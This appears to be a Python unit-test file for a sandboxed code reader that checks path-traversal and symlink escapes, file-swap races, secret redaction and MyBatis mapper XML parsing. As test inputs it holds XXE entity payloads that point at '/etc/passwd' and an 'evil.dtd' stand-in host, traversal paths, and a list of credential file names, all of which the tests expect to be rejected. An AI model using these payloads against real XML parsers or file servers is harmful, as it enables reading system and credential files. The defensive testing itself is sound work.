from __future__ import annotations

import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from octopus.code_reader import CodeReader, MAX_FILE_BYTES, MAX_OUTPUT_CHARS, redact


class CodeReaderTests(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        # macOS /var is itself a symlink; use its real path for the trusted root.
        self.directory = Path(temporary.name).resolve()
        self.root = self.directory / "shared"
        self.root.mkdir()
        self.repo = self.root / "billing"
        self.repo.mkdir()
        self.reader = CodeReader(self.root)
        self.addCleanup(self.reader.close)

    def source(self, path="billing/service.py", content="def calculate_total():\n    return 42\n"):
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
        return target

    def test_reads_code_with_relative_paths_and_pagination(self):
        self.source()
        result = self.reader.read("billing/service.py", 2, 1)
        self.assertEqual(result["path"], "billing/service.py")
        self.assertEqual(result["lines"], [{"line": 2, "content": "    return 42", "line_truncated": False}])
        self.assertEqual(result["total_lines"], 2)
        self.assertIsNone(result["next_line"])
        self.assertNotIn(str(self.root), json.dumps(result))
        first = self.reader.read("billing/service.py", 1, 1)
        self.assertEqual(first["next_line"], 2)

    def test_search_is_literal_and_scoped_to_one_repository(self):
        self.source(content="foo.*bar\nfoobar\n")
        self.source("inventory/app.java", "foo.*bar\n")
        result = self.reader.search("foo.*bar", "billing")
        self.assertEqual(len(result["matches"]), 1)
        self.assertEqual(result["matches"][0]["path"], "billing/service.py")
        self.assertEqual(result["matches"][0]["content"], "foo.*bar")
        self.assertEqual(result["matches"][0]["line"], 1)

    def test_mapper_xml_exposes_static_select_and_sql_with_original_line_numbers(self):
        original = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n'
            '  "https://mybatis.org/dtd/mybatis-3-mapper.dtd">\n'
            '<mapper namespace="billing.PaymentMapper">\n'
            '  <resultMap id="hidden_mapping" type="Payment"/>\n'
            '  <sql id="columns">payment_id, total</sql>\n'
            '  <select id="findPayment" resultType="Payment">\n'
            '    SELECT payment_id, total FROM payments WHERE payment_id = #{id}\n'
            '    <if test="total > 0">AND total &gt; 0</if>\n'
            '    <include refid="columns"/>\n'
            '  </select>\n'
            '  <insert id="hidden_insert">INSERT INTO hidden_table VALUES (1)</insert>\n'
            '</mapper>'
        )
        self.source("billing/PaymentMapper.xml", original)
        result = self.reader.read("billing/PaymentMapper.xml", line_count=100)
        by_line = {line["line"]: line["content"] for line in result["lines"]}
        self.assertEqual(result["total_lines"], len(original.splitlines()))
        for line in (1, 2, 3, 4, 5, 12, 13):
            self.assertEqual(by_line[line], "")
        for line in (8, 9, 10):
            self.assertEqual(by_line[line], original.splitlines()[line - 1])
        self.assertIn('<sql id="columns">payment_id, total</sql>', by_line[6])
        # include and dynamic SQL remain literal source; no fragment expansion.
        self.assertEqual(sum("payment_id, total" in text for text in by_line.values()), 2)
        matches = self.reader.search("FROM payments")["matches"]
        self.assertEqual([(item["path"], item["line"], item["content"]) for item in matches],
                         [("billing/PaymentMapper.xml", 8, by_line[8])])
        for hidden in ("hidden_mapping", "hidden_insert", "hidden_table", "mybatis.org"):
            self.assertEqual(self.reader.search(hidden)["matches"], [])

    def test_mapper_mask_does_not_leak_adjacent_elements_on_the_same_line(self):
        original = ('<mapper><property value="hidden_before"/><sql id="empty"/>'
                    '<insert>hidden_between</insert><select id="read">SELECT 7</select>'
                    '<update>hidden_after</update></mapper>')
        self.source("billing/InlineMapper.xml", original)
        result = self.reader.read("billing/InlineMapper.xml")
        self.assertEqual(result["total_lines"], 1)
        self.assertEqual(result["lines"][0]["content"], '<sql id="empty"/><select id="read">SELECT 7</select>')
        self.assertEqual(self.reader.search("hidden_")["matches"], [])

    def test_mapper_cdata_and_utf8_offsets_are_preserved_without_executing_markup(self):
        original = ('<mapper namespace="业务">\r\n'
                    '  <sql id="列">编号,金额</sql>\r\n'
                    '  <select id="查询"><![CDATA[SELECT 金额 FROM 交易 WHERE 金额 < 20]]></select>\r\n'
                    '</mapper>\r\n')
        self.source("billing/UnicodeMapper.xml", original)
        result = self.reader.read("billing/UnicodeMapper.xml")
        self.assertEqual(result["total_lines"], 4)
        self.assertEqual(result["lines"][2]["content"], original.splitlines()[2].lstrip())
        matches = self.reader.search("FROM 交易")["matches"]
        self.assertEqual(matches[0]["line"], 3)
        self.assertIn("<![CDATA[", matches[0]["content"])

    def test_mapper_mask_keeps_separate_carriage_return_and_line_feed_lines(self):
        for first, second in (("\r", "\n"), ("\r\n", "\n"), ("\r", "\r\n")):
            with self.subTest(first=repr(first), second=repr(second)):
                original = f"<mapper>{first}<insert>HIDDEN</insert>{second}<select>SELECT 1</select></mapper>"
                self.source("billing/LineBreakMapper.xml", original)
                result = self.reader.read("billing/LineBreakMapper.xml")
                self.assertEqual(result["total_lines"], len(original.splitlines()))
                self.assertEqual([item["content"] for item in result["lines"]], ["", "", "<select>SELECT 1</select>"])
                matches = self.reader.search("SELECT 1")["matches"]
                self.assertEqual([(item["line"], item["content"]) for item in matches], [(3, "<select>SELECT 1</select>")])
                self.assertEqual(self.reader.search("HIDDEN")["matches"], [])

    def test_mapper_doctype_is_fixed_and_internal_or_external_entities_are_rejected(self):
        invalid = (
            '<!DOCTYPE mapper SYSTEM "https://example.test/evil.dtd"><mapper><select>SELECT 1</select></mapper>',
            '<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "file:///etc/passwd"><mapper/>',
            '<!DOCTYPE mapper [<!ENTITY leak SYSTEM "file:///etc/passwd">]><mapper><select>&leak;</select></mapper>',
            '<!DOCTYPE mapper [<!ENTITY % leak SYSTEM "https://example.test/evil.dtd">%leak;]><mapper/>',
            '<!DOCTYPE mapper [<!ENTITY value "expanded_value">]><mapper><select>&value;</select></mapper>',
            '<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"><mapper><select>&unknown;</select></mapper>',
        )
        for index, original in enumerate(invalid):
            path = f"billing/Invalid{index}Mapper.xml"
            self.source(path, original)
            with self.subTest(index=index), self.assertRaises(ValueError):
                self.reader.read(path)
        self.assertEqual(self.reader.search("SELECT 1")["matches"], [])
        self.assertEqual(self.reader.search("expanded_value")["matches"], [])

    def test_mapper_http_doctype_is_ignored_without_network_or_external_file_access(self):
        self.source("billing/ReadMapper.xml", '<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" '
                    '"http://mybatis.org/dtd/mybatis-3-mapper.dtd"><mapper><select>SELECT 1</select></mapper>')
        with (patch("socket.create_connection", side_effect=AssertionError("network must not be used")),
              patch("builtins.open", side_effect=AssertionError("external files must not be opened"))):
            result = self.reader.read("billing/ReadMapper.xml")
        self.assertEqual(result["lines"][0]["content"], "<select>SELECT 1</select>")

    def test_mapper_filename_root_and_xml_wellformedness_are_restricted(self):
        for name in ("pom.xml", "settings.xml", "config.xml", "Any.xml", "Paymentmapper.xml", "PaymentMapper.XML",
                     "config.Mapper.xml", ".HiddenMapper.xml", "credentials-Mapper.xml"):
            self.source("billing/" + name, '<mapper><select>hidden_xml</select></mapper>')
            with self.subTest(name=name), self.assertRaises(ValueError):
                self.reader.read("billing/" + name)
        for index, original in enumerate((
            '<configuration><select>hidden_xml</select></configuration>',
            '<mapper xmlns="https://example.test/config"><select>hidden_xml</select></mapper>',
            '<mapper><select>hidden_xml</mapper>',
            '<mapper><wrapper><select>hidden_xml</select></wrapper></mapper>',
        )):
            path = f"billing/Root{index}Mapper.xml"
            self.source(path, original)
            if index < 3:
                with self.subTest(index=index), self.assertRaises(ValueError):
                    self.reader.read(path)
            else:
                self.assertNotIn("hidden_xml", json.dumps(self.reader.read(path)))
        self.assertEqual(self.reader.search("hidden_xml")["matches"], [])

    def test_mapper_redaction_and_existing_link_and_size_guards_remain_enforced(self):
        original = '<mapper>\n<select>\nSELECT 1 -- password = "sensitive_mapper_value"\n</select>\n</mapper>\n'
        self.source("billing/SafeMapper.xml", original)
        result = self.reader.read("billing/SafeMapper.xml")
        self.assertIn("[REDACTED]", result["lines"][2]["content"])
        self.assertNotIn("sensitive_mapper_value", json.dumps(result))
        self.assertEqual(self.reader.search("sensitive_mapper_value")["matches"], [])
        outside = self.directory / "OutsideMapper.xml"
        outside.write_text('<mapper><select>outside_mapper_marker</select></mapper>')
        (self.repo / "LinkedMapper.xml").symlink_to(outside)
        os.link(outside, self.repo / "HardlinkedMapper.xml")
        with self.assertRaises(FileNotFoundError):
            self.reader.read("billing/LinkedMapper.xml")
        with self.assertRaises(ValueError):
            self.reader.read("billing/HardlinkedMapper.xml")
        self.assertEqual(self.reader.search("outside_mapper_marker")["matches"], [])
        self.source("billing/LargeMapper.xml", '<mapper><select>' + 'x' * MAX_FILE_BYTES + '</select></mapper>')
        with self.assertRaises(ValueError):
            self.reader.read("billing/LargeMapper.xml")

    def test_reads_head_without_running_git_or_exposing_git(self):
        self.source()
        sha = "abcdef0123456789abcdef0123456789abcdef01"
        git = self.repo / ".git"
        (git / "refs" / "heads").mkdir(parents=True)
        (git / "HEAD").write_text("ref: refs/heads/main\n", encoding="ascii")
        (git / "refs" / "heads" / "main").write_text(sha + "\n", encoding="ascii")
        result = self.reader.read("billing/service.py")
        self.assertEqual(result["revision"], sha)
        self.assertEqual(result["source"], "working_tree")
        self.assertIn("uncommitted", result["revision_note"])
        self.assertEqual(self.reader.list_repositories()["repositories"],
                         [{"repository": "billing", "revision": sha}])
        with self.assertRaises(ValueError):
            self.reader.read("billing/.git/HEAD")

    def test_invalid_head_cannot_traverse_outside_git(self):
        self.source()
        git = self.repo / ".git"
        git.mkdir()
        (git / "HEAD").write_text("ref: refs/heads/../../../outside\n", encoding="ascii")
        self.assertIsNone(self.reader.read("billing/service.py")["revision"])

    def test_git_file_for_worktree_is_not_followed(self):
        self.source()
        (self.repo / ".git").write_text("gitdir: /private/other-repo\n", encoding="ascii")
        self.assertIsNone(self.reader.read("billing/service.py")["revision"])

    def test_absolute_traversal_and_hidden_paths_are_rejected(self):
        self.source()
        for path in ("/etc/passwd", "../outside.py", "billing/../service.py", "billing//service.py",
                     "billing/./service.py", "billing\\service.py", "billing/.hidden.py",
                     "billing/.secrets/value.py", "billing/.env", "billing/.env.production",
                     "billing/src/../../service.py", "billing/service.py\x00", "C:/service.py"):
            with self.subTest(path=path), self.assertRaises(ValueError):
                self.reader.read(path)

    def test_symlink_files_and_ancestors_cannot_escape(self):
        outside = self.directory / "outside"
        outside.mkdir()
        (outside / "public.py").write_text("external_unique_secret\n", encoding="utf-8")
        (self.repo / "linked.py").symlink_to(outside / "public.py")
        (self.repo / "linked").symlink_to(outside, target_is_directory=True)
        (self.root / "linked_repo").symlink_to(outside, target_is_directory=True)
        for path in ("billing/linked.py", "billing/linked/public.py", "linked_repo/public.py"):
            with self.subTest(path=path), self.assertRaises(FileNotFoundError):
                self.reader.read(path)
        self.assertEqual(self.reader.search("external_unique_secret")["matches"], [])
        self.assertEqual([item["repository"] for item in self.reader.list_repositories()["repositories"]],
                         ["billing"])

    def test_root_symlink_and_symlink_ancestor_are_rejected(self):
        linked = self.directory / "linked_root"
        linked.symlink_to(self.root, target_is_directory=True)
        for path in (linked, linked / "billing"):
            with self.subTest(path=path), self.assertRaises(ValueError):
                CodeReader(path)
        with self.assertRaises(ValueError):
            CodeReader(Path("relative/path"))

    def test_symlink_swap_between_scan_and_open_is_rejected(self):
        victim = self.source(content="harmless\n")
        outside = self.directory / "outside.py"
        outside.write_text("outside_marker\n", encoding="utf-8")
        original_open = os.open
        swapped = False

        def swap_open(name, flags, *args, **kwargs):
            nonlocal swapped
            if name == "service.py" and not swapped:
                swapped = True
                victim.unlink()
                victim.symlink_to(outside)
            return original_open(name, flags, *args, **kwargs)

        with patch("octopus.code_reader.os.open", side_effect=swap_open):
            self.assertEqual(self.reader.search("outside_marker")["matches"], [])
        self.assertTrue(swapped)

    def test_directory_swap_during_path_open_is_rejected(self):
        self.source("billing/src/service.py", "harmless\n")
        outside = self.directory / "outside"
        outside.mkdir()
        (outside / "service.py").write_text("outside_marker\n", encoding="utf-8")
        original_open = os.open
        swapped = False

        def swap_open(name, flags, *args, **kwargs):
            nonlocal swapped
            if name == "src" and not swapped:
                swapped = True
                (self.repo / "src").rename(self.repo / "old-src")
                (self.repo / "src").symlink_to(outside, target_is_directory=True)
            return original_open(name, flags, *args, **kwargs)

        with patch("octopus.code_reader.os.open", side_effect=swap_open):
            with self.assertRaises(FileNotFoundError):
                self.reader.read("billing/src/service.py")
        self.assertTrue(swapped)

    def test_hardlinks_cannot_expose_outside_source(self):
        outside = self.directory / "outside.py"
        outside.write_text("outside_marker\n", encoding="utf-8")
        os.link(outside, self.repo / "linked.py")
        with self.assertRaises(ValueError):
            self.reader.read("billing/linked.py")
        self.assertEqual(self.reader.search("outside_marker")["matches"], [])

    def test_sensitive_config_vendor_and_binary_files_are_unavailable(self):
        names = (
            ".env.py", ".git/hooks/example.py", "app-secret.py", "credentials.txt", "access-token.txt",
            "private-key.txt", "config.py", "settings.py", "application-prod.js", "bootstrap.yml",
            "application.properties", "db.json", "server.pem", "server.key", "archive.zip",
            "node_modules/pkg/index.js", "target/app.java", "vendor/lib/app.py", "build/result.py",
        )
        for name in names:
            self.source("billing/" + name, "hidden_marker\n")
            with self.subTest(name=name), self.assertRaises(ValueError):
                self.reader.read("billing/" + name)
        self.assertEqual(self.reader.search("hidden_marker")["matches"], [])
        (self.repo / "binary.py").write_bytes(b"valid-looking\x00hidden_marker")
        (self.repo / "invalid.py").write_bytes(b"\xff\xfehidden_marker")
        for name in ("binary.py", "invalid.py"):
            with self.subTest(name=name), self.assertRaises(ValueError):
                self.reader.read("billing/" + name)
        self.assertEqual(self.reader.search("hidden_marker")["matches"], [])

    def test_large_files_and_special_files_are_rejected(self):
        oversized = self.source(content="")
        with oversized.open("wb") as stream:
            stream.truncate(MAX_FILE_BYTES + 1)
        with self.assertRaises(ValueError):
            self.reader.read("billing/service.py")
        fifo = self.repo / "pipe.py"
        os.mkfifo(fifo)
        with self.assertRaises(ValueError):
            self.reader.read("billing/pipe.py")
        self.assertEqual(self.reader.search("anything")["matches"], [])

    def test_file_growing_after_fstat_is_still_bounded(self):
        self.source(content="small")
        with patch("octopus.code_reader.os.read", return_value=b"x" * 65536):
            with self.assertRaises(ValueError):
                self.reader.read("billing/service.py")

    def test_invalid_limits_are_not_coerced(self):
        self.source()
        for value in (True, False, "1", 0, -1, 101, 1.5, None):
            with self.subTest(limit=value), self.assertRaises(ValueError):
                self.reader.search("return", limit=value)
        for value in (True, "1", 0, -1, 201, 1.5):
            with self.subTest(line_count=value), self.assertRaises(ValueError):
                self.reader.read("billing/service.py", line_count=value)
        for value in (True, "1", 0, -1, 1000001, 1.5):
            with self.subTest(start_line=value), self.assertRaises(ValueError):
                self.reader.read("billing/service.py", start_line=value)
        for value in ("", "a" * 257, "line\nbreak", None, 42):
            with self.subTest(query=value), self.assertRaises(ValueError):
                self.reader.search(value)
        for value in ("billing/src", "../billing", "/billing", True):
            with self.subTest(repository=value), self.assertRaises(ValueError):
                self.reader.search("return", value)

    def test_search_result_limit_and_output_limit_are_enforced(self):
        self.source(content="matching " + "x" * 5000 + "\n" + ("matching\n" * 40))
        result = self.reader.search("matching", limit=2)
        self.assertEqual(len(result["matches"]), 2)
        self.assertTrue(result["truncated"])
        self.assertTrue(result["matches"][0]["line_truncated"])
        self.assertLessEqual(sum(len(item["content"]) for item in result["matches"]), MAX_OUTPUT_CHARS)
        self.source(content=("v" * 2000 + "\n") * 100)
        result = self.reader.read("billing/service.py", line_count=100)
        self.assertTrue(result["truncated"])
        self.assertLessEqual(sum(len(item["content"]) for item in result["lines"]), MAX_OUTPUT_CHARS)

    def test_search_file_and_time_budgets_mark_partial_results(self):
        self.source()
        with patch("octopus.code_reader.MAX_SEARCH_FILES", 0):
            result = self.reader.search("return")
        self.assertTrue(result["truncated"])
        self.assertEqual(result["matches"], [])
        with patch("octopus.code_reader.MAX_SECONDS", 0):
            result = self.reader.search("return")
        self.assertTrue(result["truncated"])
        self.assertEqual(result["matches"], [])

    def test_credentials_are_redacted_before_read_and_search(self):
        text = (
            'password = "sensitive-password-value"\n'
            'appSecret: "sensitive-app-secret"\n'
            'client_secret = "sensitive-client-secret"\n'
            'accessToken = "sensitive-access-token"\n'
            'request.headers = "Bearer sensitivebearertoken"\n'
            'dsn = "postgres://alice:veryprivate@database/db"\n'
            'apikey = "sensitive-api-key"\n'
            'key = "AKIA1234567890ABCDEF"\n'
            'key2 = "ghp_abcdefghijklmnopqrstuv1234567890"\n'
            '-----BEGIN RSA PRIVATE KEY-----\n'
            'privatepemmaterial\n'
            '-----END RSA PRIVATE KEY-----\n'
            'return 42\n'
        )
        self.source(content=text)
        output = json.dumps(self.reader.read("billing/service.py"))
        for secret in ("sensitive-password-value", "sensitive-app-secret", "sensitive-client-secret",
                       "sensitive-access-token", "sensitivebearertoken", "veryprivate", "sensitive-api-key",
                       "AKIA1234567890ABCDEF", "ghp_abcdefghijklmnopqrstuv1234567890", "privatepemmaterial"):
            self.assertNotIn(secret, output)
            self.assertEqual(self.reader.search(secret)["matches"], [])
        self.assertEqual(self.reader.search("return 42")["matches"][0]["line"], 13)
        self.assertEqual(redact(text).count("\n"), text.count("\n"))

    def test_redaction_handles_multiline_assignment_without_changing_lines(self):
        original = 'password =\n"secret-value"\nnext_line\n'
        output = redact(original)
        self.assertNotIn("secret-value", output)
        self.assertEqual(output.count("\n"), original.count("\n"))

    def test_revision_symlinks_do_not_expose_external_metadata(self):
        self.source()
        outside = self.directory / "HEAD"
        outside.write_text("a" * 40, encoding="ascii")
        git = self.repo / ".git"
        git.mkdir()
        (git / "HEAD").symlink_to(outside)
        self.assertIsNone(self.reader.read("billing/service.py")["revision"])

    def test_closed_reader_and_missing_paths_fail_without_host_paths(self):
        for path in ("missing/app.py", "billing/missing.py"):
            with self.subTest(path=path), self.assertRaises(FileNotFoundError) as caught:
                self.reader.read(path)
            self.assertNotIn(str(self.root), str(caught.exception))
        self.reader.close()
        with self.assertRaises(ValueError):
            self.reader.list_repositories()


if __name__ == "__main__":
    unittest.main()
